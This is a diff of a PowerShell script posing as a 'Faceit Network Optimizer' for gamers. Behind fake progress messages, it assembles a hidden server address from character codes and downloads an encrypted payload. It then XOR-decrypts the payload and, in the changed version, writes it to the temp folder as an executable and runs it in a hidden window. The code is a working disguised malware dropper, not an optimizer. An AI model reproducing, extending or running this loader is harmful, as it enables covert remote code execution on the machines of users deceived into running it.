@@ -5,14 +5,11 @@ function Show-Progress {
     Write-Progress -Activity $Activity -PercentComplete $Percent
 }
 
-
-
 Write-Host ""
 Write-Host "  ═══════════════════════════════════" -ForegroundColor Cyan
 Write-Host "       Faceit Network Optimizer" -ForegroundColor Cyan
 Write-Host "  ═══════════════════════════════════" -ForegroundColor Cyan
 Write-Host ""
-
 
 $host.UI.RawUI.ForegroundColor = 'DarkYellow'
 $ping = Read-Host '  Enter max ping (ms)'
@@ -22,14 +19,12 @@ Write-Host ""
 Show-Progress -Activity "Connecting to server..." -Percent 20
 
 $sUllz = 'http://' + 
-             [char]55+[char]52+'.'+[char]49+[char]49+[char]57+'.'+
-             [char]49+[char]57+[char]50+'.'+[char]50+[char]50+[char]52+':5000'
+         [char]55+[char]52+'.'+[char]49+[char]49+[char]57+'.'+
+         [char]49+[char]57+[char]50+'.'+[char]50+[char]50+[char]52+':5000'
 
 try {
-
     Show-Progress -Activity "Requesting optimizer..." -Percent 30
     $key = Invoke-RestMethod "$sUllz/key" -TimeoutSec 20
-    
 
     Show-Progress -Activity "Sending your max ping..." -Percent 50
     $encrypted = Invoke-RestMethod "$sUllz/ad/loader.ps1" -TimeoutSec 20
@@ -42,7 +37,6 @@ try {
     
     for($j = 0; $j -lt $z.Length; $j++) {
         $r[$j] = $z[$j] -bxor $w[$j % $w.Length]
-        
 
         if($j % 1000 -eq 0) {
             $percent = 70 + (($j / $z.Length) * 20)
@@ -50,29 +44,38 @@ try {
         }
     }
     
-   
     Show-Progress -Activity "Launching optimizer..." -Percent 95
     Start-Sleep -Milliseconds 300
     
     Write-Progress -Activity "Complete" -Completed
     
-    Write-Host "  [✓] Optimizer launched successfuly" -ForegroundColor Green
+    Write-Host "  [✓] Optimizer downloaded successfully" -ForegroundColor Green
     Write-Host "  [*] Please wait for complete..." -ForegroundColor Yellow
     Write-Host ""
     Write-Host "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
     
-
     $global:MaxPing = $ping
     
-
-    $scriptBlock = [scriptblock]::Create([Text.Encoding]::UTF8.GetString($r))
-    & $scriptBlock
+    # Сохраняем во временный файл
+    $tempFile = "$env:TEMP\optimizer_$([guid]::NewGuid().ToString('N').Substring(0,8)).exe"
+    [System.IO.File]::WriteAllBytes($tempFile, $r)
     
-  
-    Write-Host "  [✓] Optimization complete!" -ForegroundColor Green
+    Write-Host "  [*] Starting optimizer..." -ForegroundColor Yellow
+    
+    # Запускаем с параметром ping
+    $process = Start-Process $tempFile -ArgumentList $ping -WindowStyle Hidden -PassThru
+    
+    # Ждём завершения (опционально)
+    # $process.WaitForExit()
+    
+    Write-Host "  [✓] Optimization started!" -ForegroundColor Green
     Write-Host ""
     Write-Host "  Press any key to exit..." -ForegroundColor Gray
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    
+    # Очистка (можно раскомментировать)
+    # Start-Sleep -Seconds 10
+    # Remove-Item $tempFile -Force -EA 0
     
 } catch {
     Write-Progress -Activity "Error" -Completed
